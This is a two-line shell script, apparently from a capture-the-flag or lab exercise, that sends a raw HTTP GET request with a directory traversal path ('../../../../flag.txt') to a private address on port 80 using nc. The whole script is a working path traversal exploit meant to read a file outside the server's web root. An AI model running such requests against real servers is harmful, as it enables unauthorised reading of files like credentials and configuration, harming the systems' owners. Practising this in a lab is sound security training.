#!/bin/sh

printf 'GET ../../../../flag.txt HTTP/1.1\r\n' | nc 192.168.140.1 80
